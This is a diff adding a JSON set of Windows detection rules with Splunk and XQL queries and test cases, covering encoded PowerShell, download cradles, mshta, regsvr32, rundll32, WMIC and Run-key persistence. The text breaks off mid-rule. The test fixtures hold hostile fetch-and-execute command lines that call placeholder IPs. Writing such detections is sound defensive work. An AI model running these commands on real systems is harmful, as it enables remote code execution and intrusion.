@@ -1,0 +1,2716 @@
+{
+ "rules": [
+  {
+   "id": "DL-0001",
+   "title": "PowerShell with an encoded command",
+   "description": "PowerShell started with -EncodedCommand (or any short form PowerShell accepts, such as -enc, -en, -ec or -e) followed by a Base64 blob. Attackers use it to hide the real script from command-line logging and simple string matching. Admin tools rarely need it.",
+   "attack": [
+    "T1059.001",
+    "T1027"
+   ],
+   "tactic": "execution",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "powershell.exe",
+       "pwsh.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\s[-/]e(c|n\\w*)?\\s+[A-Za-z0-9+/]{16,}={0,2}"
+      ]
+     }
+    ],
+    "filter_sccm": [
+     {
+      "field": "parent.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "ccmexec.exe"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "selection"
+     },
+     {
+      "not": {
+       "sel": "filter_sccm"
+      }
+     }
+    ]
+   },
+   "condition_text": "selection and not filter_sccm",
+   "triage": [
+    "Decode the Base64 (it is UTF-16LE) and read the actual script.",
+    "Check the parent process. Office, a browser or a script host as parent is a strong signal.",
+    "Look for network connections and child processes from the same PowerShell process in the next minutes.",
+    "If the decoded script downloads or runs code, isolate the host and collect the payload."
+   ],
+   "false_positives": [
+    "Configuration management agents (SCCM, some RMM tools) that wrap scripts in -EncodedCommand.",
+    "Vendor installers that pass a short encoded bootstrap."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name in (\"powershell.exe\", \"pwsh.exe\") and action_process_image_command_line ~= \"(?i)\\\\s[-/]e(c|n\\\\w*)?\\\\s+[A-Za-z0-9+/]{16,}={0,2}\") and not ((actor_process_image_name != null and actor_process_image_name = \"ccmexec.exe\"))\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"pwsh.exe\") AND match(CommandLine, \"(?i)\\\\s[-/]e(c|n\\\\w*)?\\\\s+[A-Za-z0-9+/]{16,}={0,2}\")) AND NOT ((isnotnull(parent_name) AND lower(parent_name)=\"ccmexec.exe\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "powershell.exe",
+      "parent.name": "winword.exe",
+      "process.command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+     },
+     {
+      "process.name": "pwsh.exe",
+      "parent.name": "cmd.exe",
+      "process.command_line": "pwsh -EncodedCommand ZQBjAGgAbwAgACIAaABlAGwAbABvACIA"
+     },
+     {
+      "process.name": "POWERSHELL.EXE",
+      "parent.name": "explorer.exe",
+      "process.command_line": "PowerShell.exe -ec JABzAD0AJwBoAHQAdABwADoALwAvADEAMAAuADAA"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "powershell.exe",
+      "parent.name": "explorer.exe",
+      "process.command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1"
+     },
+     {
+      "process.name": "powershell.exe",
+      "parent.name": "ccmexec.exe",
+      "process.command_line": "powershell.exe -NoLogo -enc JABzAD0AJwBoAHQAdABwADoALwAvADEAMAAuADAA"
+     },
+     {
+      "process.name": "cmd.exe",
+      "parent.name": "explorer.exe",
+      "process.command_line": "cmd.exe /c echo -enc AAAAAAAAAAAAAAAAAAAAAAAA"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0002",
+   "title": "PowerShell download cradle that runs what it fetched",
+   "description": "PowerShell downloads content (Net.WebClient, Invoke-WebRequest, Invoke-RestMethod, BITS) and runs it in memory with Invoke-Expression. This is the classic first-stage loader. Downloading alone is common for admins, so the rule needs both halves.",
+   "attack": [
+    "T1059.001",
+    "T1105"
+   ],
+   "tactic": "execution",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "powershell.exe",
+       "pwsh.exe",
+       "powershell_ise.exe"
+      ]
+     }
+    ],
+    "download": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "downloadstring",
+       "downloadfile",
+       "downloaddata",
+       "net.webclient",
+       "invoke-webrequest",
+       "iwr ",
+       "invoke-restmethod",
+       "irm ",
+       "start-bitstransfer"
+      ]
+     }
+    ],
+    "execute": [
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "(\\biex\\b|invoke-expression|\\|\\s*iex)"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "and": [
+       {
+        "sel": "selection"
+       },
+       {
+        "sel": "download"
+       }
+      ]
+     },
+     {
+      "sel": "execute"
+     }
+    ]
+   },
+   "condition_text": "selection and download and execute",
+   "triage": [
+    "Pull the URL out of the command line and check its reputation and when the domain was registered.",
+    "Fetch the payload from an isolated sandbox, not from the endpoint.",
+    "Check for files written and connections made right after the event."
+   ],
+   "false_positives": [
+    "Installers for developer tools that pipe a script from the vendor (for example some package manager bootstraps)."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name in (\"powershell.exe\", \"pwsh.exe\", \"powershell_ise.exe\") and (action_process_image_command_line contains \"downloadstring\" or action_process_image_command_line contains \"downloadfile\" or action_process_image_command_line contains \"downloaddata\" or action_process_image_command_line contains \"net.webclient\" or action_process_image_command_line contains \"invoke-webrequest\" or action_process_image_command_line contains \"iwr \" or action_process_image_command_line contains \"invoke-restmethod\" or action_process_image_command_line contains \"irm \" or action_process_image_command_line contains \"start-bitstransfer\")) and action_process_image_command_line ~= \"(?i)(\\\\biex\\\\b|invoke-expression|\\\\|\\\\s*iex)\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"pwsh.exe\" OR lower(process_name)=\"powershell_ise.exe\") AND (match(CommandLine, \"(?i)downloadstring\") OR match(CommandLine, \"(?i)downloadfile\") OR match(CommandLine, \"(?i)downloaddata\") OR match(CommandLine, \"(?i)net\\\\.webclient\") OR match(CommandLine, \"(?i)invoke\\\\-webrequest\") OR match(CommandLine, \"(?i)iwr\\\\ \") OR match(CommandLine, \"(?i)invoke\\\\-restmethod\") OR match(CommandLine, \"(?i)irm\\\\ \") OR match(CommandLine, \"(?i)start\\\\-bitstransfer\"))) AND match(CommandLine, \"(?i)(\\\\biex\\\\b|invoke-expression|\\\\|\\\\s*iex)\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\""
+     },
+     {
+      "process.name": "pwsh.exe",
+      "process.command_line": "pwsh -c \"iwr https://example.org/s.ps1 -UseBasicParsing | iex\""
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Invoke-Expression (Invoke-RestMethod http://198.51.100.7/stage2)"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Invoke-WebRequest https://example.org/tool.zip -OutFile C:\\temp\\tool.zip"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Get-ChildItem C:\\ -Recurse | Select-Object Name"
+     },
+     {
+      "process.name": "cmd.exe",
+      "process.command_line": "cmd /c curl http://example.org | iex"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0003",
+   "title": "Office application starts a shell or script host",
+   "description": "Word, Excel, PowerPoint, Outlook or another Office app starts cmd, PowerShell, a script host or a LOLBin. This is what a malicious macro or an exploited document looks like on the endpoint. Office almost never needs to do this on its own.",
+   "attack": [
+    "T1204.002",
+    "T1566.001"
+   ],
+   "tactic": "execution",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "parent.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "winword.exe",
+       "excel.exe",
+       "powerpnt.exe",
+       "outlook.exe",
+       "msaccess.exe",
+       "mspub.exe",
+       "onenote.exe",
+       "visio.exe"
+      ]
+     },
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "cmd.exe",
+       "powershell.exe",
+       "pwsh.exe",
+       "wscript.exe",
+       "cscript.exe",
+       "mshta.exe",
+       "rundll32.exe",
+       "regsvr32.exe",
+       "certutil.exe",
+       "bitsadmin.exe",
+       "schtasks.exe",
+       "msbuild.exe",
+       "wmic.exe"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Identify the document the Office process had open and where it came from (mail attachment, download, share).",
+    "Read the child command line and follow any download or new process it started.",
+    "Search for the same document hash or sender across other mailboxes and endpoints."
+   ],
+   "false_positives": [
+    "Business macros that call cmd or PowerShell on purpose. Build an allowlist by document path and signer."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\", \"outlook.exe\", \"msaccess.exe\", \"mspub.exe\", \"onenote.exe\", \"visio.exe\") and action_process_image_name in (\"cmd.exe\", \"powershell.exe\", \"pwsh.exe\", \"wscript.exe\", \"cscript.exe\", \"mshta.exe\", \"rundll32.exe\", \"regsvr32.exe\", \"certutil.exe\", \"bitsadmin.exe\", \"schtasks.exe\", \"msbuild.exe\", \"wmic.exe\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (lower(parent_name)=\"winword.exe\" OR lower(parent_name)=\"excel.exe\" OR lower(parent_name)=\"powerpnt.exe\" OR lower(parent_name)=\"outlook.exe\" OR lower(parent_name)=\"msaccess.exe\" OR lower(parent_name)=\"mspub.exe\" OR lower(parent_name)=\"onenote.exe\" OR lower(parent_name)=\"visio.exe\") AND (lower(process_name)=\"cmd.exe\" OR lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"pwsh.exe\" OR lower(process_name)=\"wscript.exe\" OR lower(process_name)=\"cscript.exe\" OR lower(process_name)=\"mshta.exe\" OR lower(process_name)=\"rundll32.exe\" OR lower(process_name)=\"regsvr32.exe\" OR lower(process_name)=\"certutil.exe\" OR lower(process_name)=\"bitsadmin.exe\" OR lower(process_name)=\"schtasks.exe\" OR lower(process_name)=\"msbuild.exe\" OR lower(process_name)=\"wmic.exe\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "parent.name": "WINWORD.EXE",
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell -w hidden -c iex(...)"
+     },
+     {
+      "parent.name": "excel.exe",
+      "process.name": "mshta.exe",
+      "process.command_line": "mshta http://203.0.113.9/x.hta"
+     }
+    ],
+    "no_match": [
+     {
+      "parent.name": "winword.exe",
+      "process.name": "splwow64.exe",
+      "process.command_line": "splwow64.exe 8192"
+     },
+     {
+      "parent.name": "explorer.exe",
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0004",
+   "title": "mshta runs a remote HTA or inline script",
+   "description": "mshta.exe executes an HTA from a URL or inline JavaScript/VBScript. It is a signed Microsoft binary, so it is a favourite way to run script while bypassing application allowlisting.",
+   "attack": [
+    "T1218.005"
+   ],
+   "tactic": "execution",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "mshta.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "http://",
+       "https://",
+       "javascript:",
+       "vbscript:",
+       "about:"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Retrieve the URL or inline script from the command line and analyse it in a sandbox.",
+    "Check child processes and network connections of mshta."
+   ],
+   "false_positives": [
+    "Very old line-of-business apps built on HTA that load pages from an intranet server."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"mshta.exe\" and (action_process_image_command_line contains \"http://\" or action_process_image_command_line contains \"https://\" or action_process_image_command_line contains \"javascript:\" or action_process_image_command_line contains \"vbscript:\" or action_process_image_command_line contains \"about:\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"mshta.exe\" AND (match(CommandLine, \"(?i)http://\") OR match(CommandLine, \"(?i)https://\") OR match(CommandLine, \"(?i)javascript:\") OR match(CommandLine, \"(?i)vbscript:\") OR match(CommandLine, \"(?i)about:\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "mshta.exe",
+      "process.command_line": "mshta.exe https://198.51.100.7/update.hta"
+     },
+     {
+      "process.name": "mshta.exe",
+      "process.command_line": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc\"\":close\")"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "mshta.exe",
+      "process.command_line": "mshta.exe C:\\Program Files\\Vendor\\setup.hta"
+     },
+     {
+      "process.name": "msedge.exe",
+      "process.command_line": "msedge.exe https://example.org"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0005",
+   "title": "regsvr32 loads a remote scriptlet (Squiblydoo)",
+   "description": "regsvr32 with /i:<URL> and scrobj.dll fetches and runs a COM scriptlet from the internet. The technique is called Squiblydoo. Legitimate COM registration never points at a URL.",
+   "attack": [
+    "T1218.010"
+   ],
+   "tactic": "execution",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "regsvr32.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "/i:http",
+       "-i:http",
+       "scrobj.dll",
+       "/i:\\\\",
+       "-i:\\\\"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Pull the scriptlet URL and analyse the .sct content.",
+    "Check for child processes of regsvr32 and outbound connections."
+   ],
+   "false_positives": [
+    "None expected. Investigate every hit."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"regsvr32.exe\" and (action_process_image_command_line contains \"/i:http\" or action_process_image_command_line contains \"-i:http\" or action_process_image_command_line contains \"scrobj.dll\" or action_process_image_command_line contains \"/i:\\\\\\\\\" or action_process_image_command_line contains \"-i:\\\\\\\\\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"regsvr32.exe\" AND (match(CommandLine, \"(?i)/i:http\") OR match(CommandLine, \"(?i)\\\\-i:http\") OR match(CommandLine, \"(?i)scrobj\\\\.dll\") OR match(CommandLine, \"(?i)/i:\\\\\\\\\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\-i:\\\\\\\\\\\\\\\\\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "regsvr32.exe",
+      "process.command_line": "regsvr32 /s /n /u /i:http://203.0.113.9/file.sct scrobj.dll"
+     },
+     {
+      "process.name": "regsvr32.exe",
+      "process.command_line": "regsvr32.exe -s -u -i:\\\\10.0.0.5\\share\\x.sct scrobj.dll"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "regsvr32.exe",
+      "process.command_line": "regsvr32.exe /s C:\\Program Files\\Vendor\\component.dll"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0006",
+   "title": "rundll32 runs script or loads from a URL",
+   "description": "rundll32 is used to run JavaScript through mshtml (RunHTMLApplication) or to load content from a URL or WebDAV path. Normal rundll32 use names a local DLL and an export.",
+   "attack": [
+    "T1218.011"
+   ],
+   "tactic": "execution",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "rundll32.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "javascript:",
+       "mshtml,runhtmlapplication",
+       "http://",
+       "https://",
+       "@ssl\\davwwwroot"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Identify the DLL or script being loaded and get a copy from the path or URL.",
+    "Check the parent process to see how rundll32 was launched."
+   ],
+   "false_positives": [
+    "Rare. Some printer or update utilities pass a URL as an argument to their own DLL. Allowlist by DLL path."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"rundll32.exe\" and (action_process_image_command_line contains \"javascript:\" or action_process_image_command_line contains \"mshtml,runhtmlapplication\" or action_process_image_command_line contains \"http://\" or action_process_image_command_line contains \"https://\" or action_process_image_command_line contains \"@ssl\\\\davwwwroot\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"rundll32.exe\" AND (match(CommandLine, \"(?i)javascript:\") OR match(CommandLine, \"(?i)mshtml,runhtmlapplication\") OR match(CommandLine, \"(?i)http://\") OR match(CommandLine, \"(?i)https://\") OR match(CommandLine, \"(?i)@ssl\\\\\\\\davwwwroot\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "rundll32.exe",
+      "process.command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://203.0.113.9/x\")"
+     },
+     {
+      "process.name": "rundll32.exe",
+      "process.command_line": "rundll32 \\\\files.example.org@SSL\\DavWWWRoot\\payload.dll,Start"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "rundll32.exe",
+      "process.command_line": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0007",
+   "title": "Script host runs a script from a user-writable folder",
+   "description": "wscript or cscript runs a .js, .jse, .vbs, .vbe or .wsf file from AppData, Temp, Downloads or Public. This is how many phishing ZIP attachments start their chain.",
+   "attack": [
+    "T1059.005",
+    "T1059.007"
+   ],
+   "tactic": "execution",
+   "severity": "medium",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "wscript.exe",
+       "cscript.exe"
+      ]
+     }
+    ],
+    "user_path": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "\\appdata\\",
+       "\\temp\\",
+       "\\downloads\\",
+       "\\users\\public\\",
+       "\\desktop\\"
+      ]
+     }
+    ],
+    "script": [
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\.(js|jse|vbs|vbe|wsf|wsh)\\b"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "and": [
+       {
+        "sel": "selection"
+       },
+       {
+        "sel": "user_path"
+       }
+      ]
+     },
+     {
+      "sel": "script"
+     }
+    ]
+   },
+   "condition_text": "selection and user_path and script",
+   "triage": [
+    "Get the script file and read it (deobfuscate JScript if needed).",
+    "Find how it arrived, usually an email attachment or a browser download in the minutes before."
+   ],
+   "false_positives": [
+    "Logon scripts or helpdesk scripts copied to a user profile. Allowlist by script hash."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name in (\"wscript.exe\", \"cscript.exe\") and (action_process_image_command_line contains \"\\\\appdata\\\\\" or action_process_image_command_line contains \"\\\\temp\\\\\" or action_process_image_command_line contains \"\\\\downloads\\\\\" or action_process_image_command_line contains \"\\\\users\\\\public\\\\\" or action_process_image_command_line contains \"\\\\desktop\\\\\")) and action_process_image_command_line ~= \"(?i)\\\\.(js|jse|vbs|vbe|wsf|wsh)\\\\b\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((lower(process_name)=\"wscript.exe\" OR lower(process_name)=\"cscript.exe\") AND (match(CommandLine, \"(?i)\\\\\\\\appdata\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\temp\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\downloads\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\users\\\\\\\\public\\\\\\\\\") OR match(CommandLine, \"(?i)\\\\\\\\desktop\\\\\\\\\"))) AND match(CommandLine, \"(?i)\\\\.(js|jse|vbs|vbe|wsf|wsh)\\\\b\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "wscript.exe",
+      "process.command_line": "wscript.exe \"C:\\Users\\amine\\Downloads\\Facture_2026.js\""
+     },
+     {
+      "process.name": "cscript.exe",
+      "process.command_line": "cscript //nologo C:\\Users\\sara\\AppData\\Local\\Temp\\a.vbs"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "cscript.exe",
+      "process.command_line": "cscript C:\\Windows\\System32\\slmgr.vbs /dli"
+     },
+     {
+      "process.name": "wscript.exe",
+      "process.command_line": "wscript.exe C:\\Users\\amine\\Downloads\\readme.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0008",
+   "title": "WMIC creates a process, locally or on another host",
+   "description": "wmic process call create starts a program through WMI. With /node it runs on a remote machine, which is a common lateral movement method. Admins mostly use other tools today.",
+   "attack": [
+    "T1047"
+   ],
+   "tactic": "execution",
+   "severity": "medium",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "wmic.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "process",
+       "call",
+       "create"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Note any /node target and check that host for the started process.",
+    "Confirm the account and whether it normally administers that host."
+   ],
+   "false_positives": [
+    "Older admin scripts and some software deployment tools."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"wmic.exe\" and (action_process_image_command_line contains \"process\" and action_process_image_command_line contains \"call\" and action_process_image_command_line contains \"create\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"wmic.exe\" AND (match(CommandLine, \"(?i)process\") AND match(CommandLine, \"(?i)call\") AND match(CommandLine, \"(?i)create\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "wmic.exe",
+      "process.command_line": "wmic /node:10.0.0.5 process call create \"cmd.exe /c whoami > C:\\out.txt\""
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "wmic.exe",
+      "process.command_line": "wmic os get caption"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0009",
+   "title": "Run key points to a user-writable path or a script host",
+   "description": "A value is written under ...\\CurrentVersion\\Run or RunOnce and its data points into AppData, Temp, Public or ProgramData, or launches a script host or LOLBin. This is the most common way commodity malware survives a reboot.",
+   "attack": [
+    "T1547.001"
+   ],
+   "tactic": "persistence",
+   "severity": "medium",
+   "logsource": "registry_set",
+   "selections": {
+    "run_key": [
+     {
+      "field": "registry.key",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "\\software\\microsoft\\windows\\currentversion\\run"
+      ]
+     }
+    ],
+    "writable_target": [
+     {
+      "field": "registry.data",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "\\appdata\\",
+       "\\temp\\",
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\downloads\\"
+      ]
+     }
+    ],
+    "lolbin_target": [
+     {
+      "field": "registry.data",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "powershell",
+       "mshta",
+       "wscript",
+       "cscript",
+       "rundll32",
+       "regsvr32",
+       "cmd.exe /c",
+       "cmd /c"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "run_key"
+     },
+     {
+      "or": [
+       {
+        "sel": "writable_target"
+       },
+       {
+        "sel": "lolbin_target"
+       }
+      ]
+     }
+    ]
+   },
+   "condition_text": "run_key and (writable_target or lolbin_target)",
+   "triage": [
+    "Check the binary or script the value points to (signature, hash, age, prevalence across the fleet).",
+    "Identify the process that wrote the value and its own origin.",
+    "Remove the value only after collecting the payload."
+   ],
+   "false_positives": [
+    "Per-user installs (Teams, Zoom, OneDrive, Discord, Spotify) live in AppData. Allowlist by signer and exact path."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.REGISTRY and event_sub_type = ENUM.REGISTRY_SET_VALUE\n| filter action_registry_key_name contains \"\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\" and ((action_registry_data contains \"\\\\appdata\\\\\" or action_registry_data contains \"\\\\temp\\\\\" or action_registry_data contains \"\\\\users\\\\public\\\\\" or action_registry_data contains \"\\\\programdata\\\\\" or action_registry_data contains \"\\\\downloads\\\\\") or (action_registry_data contains \"powershell\" or action_registry_data contains \"mshta\" or action_registry_data contains \"wscript\" or action_registry_data contains \"cscript\" or action_registry_data contains \"rundll32\" or action_registry_data contains \"regsvr32\" or action_registry_data contains \"cmd.exe /c\" or action_registry_data contains \"cmd /c\"))\n| fields _time, agent_hostname, actor_process_image_name, action_registry_key_name, action_registry_value_name, action_registry_data\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=13\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), reg_key=replace(TargetObject,\"\\\\\\\\[^\\\\\\\\]*$\",\"\"), reg_value=mvindex(split(TargetObject,\"\\\\\"),-1)\n| where match(reg_key, \"(?i)\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\") AND ((match(Details, \"(?i)\\\\\\\\appdata\\\\\\\\\") OR match(Details, \"(?i)\\\\\\\\temp\\\\\\\\\") OR match(Details, \"(?i)\\\\\\\\users\\\\\\\\public\\\\\\\\\") OR match(Details, \"(?i)\\\\\\\\programdata\\\\\\\\\") OR match(Details, \"(?i)\\\\\\\\downloads\\\\\\\\\")) OR (match(Details, \"(?i)powershell\") OR match(Details, \"(?i)mshta\") OR match(Details, \"(?i)wscript\") OR match(Details, \"(?i)cscript\") OR match(Details, \"(?i)rundll32\") OR match(Details, \"(?i)regsvr32\") OR match(Details, \"(?i)cmd\\\\.exe\\\\ /c\") OR match(Details, \"(?i)cmd\\\\ /c\")))\n| table _time host Image TargetObject Details\n| sort - _time\n",
+   "tests": {
+    "match": [
